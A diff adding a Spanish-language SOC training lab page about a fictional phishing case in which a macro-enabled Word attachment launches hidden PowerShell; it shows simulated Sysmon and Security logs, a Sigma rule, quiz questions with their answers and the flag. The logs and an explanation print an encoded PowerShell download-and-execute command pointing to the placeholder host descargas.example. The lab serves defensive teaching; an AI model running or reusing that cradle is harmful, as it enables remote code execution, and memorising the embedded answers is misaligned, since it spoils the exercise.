@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>El hijo de Word · Labs N4zar1</title>
+<meta name="description" content="Reto de analista SOC: un Word con macro abrió PowerShell a escondidas y el antivirus no dijo nada. Lee el árbol de procesos en Sysmon y en el evento 4688, descodifica la orden y decide qué lo habría parado.">
+<meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#0a0a0a" media="(prefers-color-scheme: dark)">
+<link rel="icon" type="image/png" href="../assets/favicon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="../assets/lab.css">
+<style>.evidence h3{margin:0;font:inherit}.evidence td{word-break:break-all}pre.code{margin:0;padding:16px 18px;overflow:auto;font:500 14px/1.6 var(--mono);color:var(--fg2)}pre.code b{color:var(--alert);font-weight:700}</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="top">
+    <a class="brand" href="../index.html"><img class="b" src="../assets/avatar.jpg" alt="" width="30" height="30">N4zar1 <span class="sub">Labs</span></a>
+    <nav><a class="opc" href="../index.html">Todos los labs</a><a data-goatcounter-click="ir-a-tienda" href="https://tienda.n4zar1.com">Tienda</a></nav>
+  </header>
+
+  <h1>El hijo de Word</h1>
+  <p class="lede">Medio · ~12 min · Basado en el vídeo «Esto no es Word. Es un virus. Y tu antivirus no lo vio».</p>
+
+  <div class="brief">
+    <p><b>El caso.</b> Orvia, una empresa ficticia. Martes, 09:12: a Ana, de contabilidad, le llega un correo «Factura pendiente · vence hoy» con un Word adjunto. Lo abre en PC-CONTA-07 y pulsa «Habilitar contenido». El antivirus no avisa de nada. A las 09:14 salta una alerta en el SIEM.</p>
+    <p><b>Tu misión:</b> reconstruye el árbol de procesos (quién abrió a quién), descubre qué hizo la orden escondida, encuentra lo que se descargó y decide qué lo habría parado. Chuleta: <code>-w hidden</code> abre PowerShell sin ventana; <code>-enc</code> recibe la orden en Base64 (texto UTF-16LE). Para descodificarla puedes usar CyberChef («From Base64» + «Decode text: UTF-16LE»). Ojo: no todo hijo de Word es malo.</p>
+  </div>
+
+  <div class="evidence" id="ev1">
+    <div class="hd"><h3>1 · El correo (cabeceras resumidas)</h3></div>
+    <pre class="code">Fecha:   martes 09:12:04
+De:      Administración &lt;facturas@<b>pagos-proveedor.example</b>&gt;
+Para:    ana@orvia.example
+Asunto:  Factura pendiente · vence hoy
+Adjunto: <b>Factura_0347.docm</b> (48 KB, Word con macros)</pre>
+  </div>
+
+  <div class="evidence" id="ev2">
+    <div class="hd"><h3>2 · Sysmon · evento 1 (Process Create) · PC-CONTA-07</h3>
+      <span class="tools"><input id="q2" placeholder="Buscar (proceso, comando…)" aria-label="Buscar en la creación de procesos"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev3">
+    <div class="hd"><h3>3 · Sysmon · evento 3 (conexiones de red) · PC-CONTA-07</h3>
+      <span class="tools"><input id="q3" placeholder="Buscar (proceso, IP, dominio…)" aria-label="Buscar en las conexiones"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev4">
+    <div class="hd"><h3>4 · Registro de Seguridad · PC-CONTA-07 (copia en el SIEM)</h3>
+      <span class="tools"><input id="q4" placeholder="Buscar (ID, proceso…)" aria-label="Buscar en el registro de Seguridad"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev5">
+    <div class="hd"><h3>5 · La alerta: regla Sigma pública de SigmaHQ (resumida)</h3></div>
+    <pre class="code">title: Suspicious Microsoft Office Child Process
+id: 438025f9-5856-4663-83f7-52f878a70a50
+logsource:
+  category: process_creation      # Sysmon 1 o 4688 con línea de comandos
+detection:
+  selection_parent:
+    ParentImage|endswith: [ <b>'\WINWORD.EXE'</b>, '\EXCEL.EXE', '\POWERPNT.exe', … ]
+  selection_child_processes:
+    Image|endswith: [ <b>'\powershell.exe'</b>, '\cmd.exe', '\mshta.exe', '\wscript.exe', … ]
+  condition: selection_parent and 1 of selection_child_*
+level: high
+
+Alerta 09:14:21 · PC-CONTA-07 · high · estado: sin revisar</pre>
+  </div>
+
+  <div class="tasks" id="tasks"></div>
+
+  <div class="win" id="win">
+    <h2>Reto completado</h2>
+    <p>Bandera: <code id="flag"></code></p>
+    <p>Lo que haría Orvia: aislar PC-CONTA-07 de la red sin apagarlo, avisar a respuesta a incidentes, bloquear <code>descargas.example</code> y <code>203.0.113.50</code>, borrar el correo del resto de buzones y buscar <code>onedrv.exe</code> en los demás equipos. Para la próxima: que Office bloquee las macros de Internet (el comportamiento por defecto desde 2022, que alguien había desactivado por directiva) y la regla ASR de Defender «Bloquear que todas las aplicaciones de Office creen procesos secundarios» (<code>d4f940ab-401b-4efc-aadc-ad5f3c50688a</code>), probándola antes en modo auditoría.</p>
+    <button class="btn ghost" id="reset">Reiniciar el reto</button>
+  </div>
+
+  <footer class="foot"><span>Empresa, personas, equipos, dominios (.example) e IP de documentación ficticios; la orden en Base64 apunta a un dominio que no existe. Nada sale de tu navegador. Por Nazarí · N4zar1</span><a href="../index.html">← Volver a los labs</a></footer>
+</div>
+<script src="../assets/lab.js"></script>
+<script>
+const $ = id => document.getElementById(id);
+const q = () => (r, v) => !v || r.join(' ').toLowerCase().includes(v.toLowerCase());
+const B64 = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZABlAHMAYwBhAHIAZwBhAHMALgBlAHgAYQBtAHAAbABlAC8AZgAuAHAAcwAxACcAKQA=';
+
+makeTable({
+  el: $('ev2'),
+  cols: ['Hora', 'ParentImage', 'Image', 'CommandLine'],
+  rows: [
+    ['09:01:15', 'explorer.exe', 'OUTLOOK.EXE', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"'],
+    ['09:13:40', 'OUTLOOK.EXE', 'WINWORD.EXE', '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\ana\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\X7Q2LM0A\\Factura_0347.docm"'],
+    ['09:13:58', 'WINWORD.EXE', 'splwow64.exe', 'C:\\Windows\\splwow64.exe 12288'],
+    ['09:14:21', 'WINWORD.EXE', 'powershell.exe', 'powershell.exe -nop -w hidden -enc ' + B64],
+    ['09:14:24', 'powershell.exe', 'onedrv.exe', '"C:\\Users\\ana\\AppData\\Roaming\\OneDrv\\onedrv.exe" /sync'],
+    ['09:20:11', 'explorer.exe', 'powershell.exe', 'powershell.exe -File C:\\Scripts\\inventario_impresoras.ps1'],
+  ],
+  cls: r => r[3].includes('-enc') || r[2] === 'onedrv.exe' ? 'w' : '',
+  filters: [{el: $('q2'), test: q()}],
+});
+
+makeTable({
+  el: $('ev3'),
+  cols: ['Hora', 'Image', 'Destino', 'Puerto'],
+  rows: [
+    ['09:01:20', 'OUTLOOK.EXE', 'outlook.office365.com (52.97.x.x)', '443'],
+    ['09:14:22', 'powershell.exe', 'descargas.example (203.0.113.50)', '80'],
+    ['09:14:23', 'powershell.exe', 'descargas.example (203.0.113.50)', '80'],
+    ['09:14:31', 'onedrv.exe', '203.0.113.77', '443'],
+  ],
+  cls: r => r[1] !== 'OUTLOOK.EXE' ? 'w' : '',
+  filters: [{el: $('q3'), test: q()}],
+});
+
+makeTable({
+  el: $('ev4'),
+  cols: ['Hora', 'ID', 'Creator Process Name', 'New Process Name · Process Command Line'],
+  rows: [
+    ['09:13:40', '4688', 'OUTLOOK.EXE', 'WINWORD.EXE · /n "…\\Factura_0347.docm"'],
+    ['09:14:21', '4688', 'WINWORD.EXE', 'powershell.exe · -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3…'],
+    ['09:14:24', '4688', 'powershell.exe', 'onedrv.exe · /sync'],
+  ],
+  cls: r => r[2] === 'WINWORD.EXE' ? 'w' : '',
+  filters: [{el: $('q4'), test: q()}],
+});
+
+runLab('arbol-de-procesos', [
+  {q: '¿Qué proceso es el padre del PowerShell de las 09:14:21?', type: 'text', ph: 'nombre del ejecutable',
+   accept: a => ['winword.exe', 'winword', 'word'].includes(norm(a).replace(/\s/g, '')),
+   hint: 'Evidencia 2: columna ParentImage de la línea de las 09:14:21.',
+   explain: '<b>WINWORD.EXE</b>. Word no tiene ningún motivo para abrir PowerShell: es justo lo que busca la regla Sigma de la evidencia 5 (padre Office + hijo intérprete de comandos). MITRE lo recoge como T1204.002 (archivo malicioso) y T1059.001 (PowerShell).'},
+  {q: '¿Qué archivo abrió ese Word?', type: 'text', ph: 'nombre del archivo',
+   accept: a => ['factura_0347.docm', 'factura_0347'].includes(norm(a).replace(/\s/g, '')),
+   hint: 'La línea de comandos de WINWORD.EXE (09:13:40) o el adjunto del correo.',
+   explain: '<b>Factura_0347.docm</b>, abierto desde la caché de adjuntos de Outlook (<code>Content.Outlook</code>). La «m» de .docm significa que lleva macros. El correo venía de <code>pagos-proveedor.example</code>, no de un proveedor conocido (T1566.001, adjunto de phishing).'},
+  {q: 'Word tiene dos hijos: splwow64.exe (09:13:58) y powershell.exe (09:14:21). ¿Cuál es normal?', type: 'choice',
+   options: ['Los dos son maliciosos', 'splwow64.exe: es el ayudante de impresión de Windows que usan las aplicaciones de 32 bits como Office; no está en la lista de la regla', 'powershell.exe: Word lo usa para guardar documentos'], correct: 1,
+   wrong: '✗ Mira qué hijos busca la regla de la evidencia 5.',
+   explain: '<b>splwow64.exe es normal.</b> Por eso la regla Sigma no busca «cualquier hijo de Word», sino hijos que sirven para ejecutar órdenes: powershell, cmd, mshta, wscript, rundll32… Así no salta cada vez que alguien imprime.'},
+  {q: '¿Qué parámetro hace que PowerShell se abra sin ventana?', type: 'text', ph: 'parámetro',
+   accept: a => ['-whidden', 'whidden', 'hidden', '-windowstylehidden', 'windowstylehidden'].includes(norm(a).replace(/\s/g, '')),
+   hint: 'Está justo después de -nop.',
+   explain: '<b>-w hidden</b> (abreviatura de <code>-WindowStyle Hidden</code>): Ana no vio nada en pantalla. <code>-nop</code> (NoProfile) evita cargar su perfil de PowerShell.'},
+  {q: 'Descodifica el -enc. ¿A qué dominio pide el script?', type: 'text', ph: 'dominio',
+   accept: a => norm(a).replace(/\s/g, '').replace(/^https?:\/\//, '').replace(/\/.*$/, '') === 'descargas.example',
+   hint: 'CyberChef: From Base64 + Decode text (UTF-16LE). O mira la evidencia 3, un segundo después.',
+   explain: 'Dice <code>IEX (New-Object Net.WebClient).DownloadString(\'http://<b>descargas.example</b>/f.ps1\')</code>: descarga un script y lo ejecuta en memoria (IEX). La evidencia 3 lo confirma: <code>powershell.exe</code> conectando a 203.0.113.50 por el puerto 80 a las 09:14:22.'},
+  {q: '¿Qué programa dejó instalado en el equipo?', type: 'text', ph: 'nombre del ejecutable',
+   accept: a => ['onedrv.exe', 'onedrv'].includes(norm(a).replace(/\s/g, '')),
+   hint: 'Evidencia 2: el hijo de powershell.exe.',
+   explain: '<b>onedrv.exe</b>, en <code>AppData\\Roaming\\OneDrv</code>: un nombre que imita a OneDrive en una carpeta donde OneDrive no vive. A las 09:14:31 ya hablaba con otro servidor (203.0.113.77): probablemente su servidor de control.'},
+  {q: 'Si la empresa no tuviera Sysmon, ¿qué ID del registro de Seguridad te da el mismo dato (padre y línea de comandos)?', type: 'text', ph: 'número',
+   accept: a => norm(a).replace(/\s/g, '') === '4688',
+   hint: 'Evidencia 4.',
+   explain: '<b>4688</b>, «Se ha creado un proceso nuevo»: trae el padre (Creator Process Name) y, si se activa la directiva «Incluir la línea de comandos en los eventos de creación de procesos», también la línea de comandos. Sin esa directiva verías que Word abrió PowerShell, pero no la orden.'},
+  {q: '¿Qué habría parado el ataque antes de que PowerShell llegara a ejecutarse?', type: 'choice',
+   options: ['Pasar el antivirus otra vez al documento', 'La regla ASR de Defender que impide a las aplicaciones de Office crear procesos secundarios (y que Office bloquee las macros de archivos de Internet)', 'Borrar el correo después de abrirlo'], correct: 1,
+   wrong: '✗ El antivirus ya lo miró y no lo conocía: piensa en algo que no dependa de conocer el archivo.',
+   explain: '<b>La regla ASR</b> <code>d4f940ab-401b-4efc-aadc-ad5f3c50688a</code> bloquea el comportamiento, no el archivo: da igual que la macro sea nueva. Y desde 2022 Office bloquea por defecto las macros de archivos que vienen de Internet (marca de la web); en este caso alguien lo había desactivado por directiva.'},
+], 'N4{word_no_tiene_hijos}');
+</script>
+<script data-goatcounter="https://n4zar1.goatcounter.com/count" async src="https://gc.zgo.at/count.js"></script>
+</body>
+</html>
